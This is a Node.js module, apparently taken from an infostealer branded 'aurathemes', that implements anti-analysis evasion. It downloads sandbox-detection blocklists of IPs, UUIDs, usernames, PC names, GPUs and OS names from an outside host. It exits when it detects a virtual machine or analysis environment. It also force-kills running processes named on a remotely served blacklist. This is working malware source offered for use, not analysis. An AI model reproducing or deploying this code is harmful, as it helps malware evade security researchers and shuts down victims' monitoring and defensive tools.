const util = require("util");
const process = require("process");
const child_process = require("child_process");
const axios = require("axios");

const exec = util.promisify(child_process.exec);

const request = async (url) => {
  try {
    return (await axios.get(url)).data;
  } catch (error) {
    console.error(error);
    return {};
  }
};

const killer = async (url, command) => {
  try {
    let stdout = (await exec(command)).stdout.split(/\r?\n/);
    let black_list = (await request(url)).blacklistedprog;
    for (let line of stdout) {
      let name = line.split(/\s+/)[0].replace(".exe", "");
      if (name.toLowerCase() !== "cmd" && black_list.includes(name)) {
        try {
          await exec(`taskkill /F /IM ${name}.exe`);
        } catch (err) {
          return "";
        }
      }
    }
  } catch (error) {
    console.error(error);
  }
};

const is_blocked = async (url, value) => {
  try {
    return (await request(url)).includes(value);
  } catch (error) {
    console.error(error);
    return false;
  }
};

const kill_blacklist = async () => await killer("https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true", "tasklist");

const check_blocked = async (category, value) => await is_blocked(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${category}?aurathemes=true`, value);

const gpu_blocked = async (value) => await check_blocked("gpus", value);

const os_blocked = async (value) => await check_blocked("oss", value);

const name_blocked = async (value) => await check_blocked("pcnames", value);

const username_blocked = async (value) => await check_blocked("progr", value);

const uuid_blocked = async (value) => await check_blocked("uuids", value);

const ip_blocked = async (value) => await check_blocked("ips", value);

const antidebug = async (res, disk, ram, uid, cpu_count, ip, os, cpu, gpu, win_key, win_ver) => {
  if (res !== true) return;
  try {
    const [
      computer_name,
      user_name
    ] = [
        process.env.COMPUTERNAME || "Not found",
        process.env.USERNAME || "Not found"
      ];

    const [
      IS_IP_BLOCKED,
      IS_UUID_BLOCKED,
      IS_USERNAME_BLOCKED,
      IS_NAME_BLOCKED,
      IS_OS_BLOCKED,
      IS_GPU_BLOCKED
    ] = await Promise.all([
      ip_blocked(ip),
      uuid_blocked(uid),
      username_blocked(user_name),
      name_blocked(computer_name),
      os_blocked(os),
      gpu_blocked(gpu)
    ]);

    if ((
      !isNaN(disk) && disk < 80 &&
      !isNaN(ram) && ram < 2
    )
      || (!isNaN(cpu_count) && cpu_count < 2)
      || IS_IP_BLOCKED
      || IS_UUID_BLOCKED
      || IS_USERNAME_BLOCKED
      || IS_NAME_BLOCKED
      || IS_OS_BLOCKED
      || IS_GPU_BLOCKED
    ) {
      process.abort();
      process.exit(1);
    }
    try {
      await kill_blacklist();
    } catch (error) {
      console.error(error);
    }
  } catch (error) {
    console.error(error);
  }
};

module.exports = {
  antidebug
}
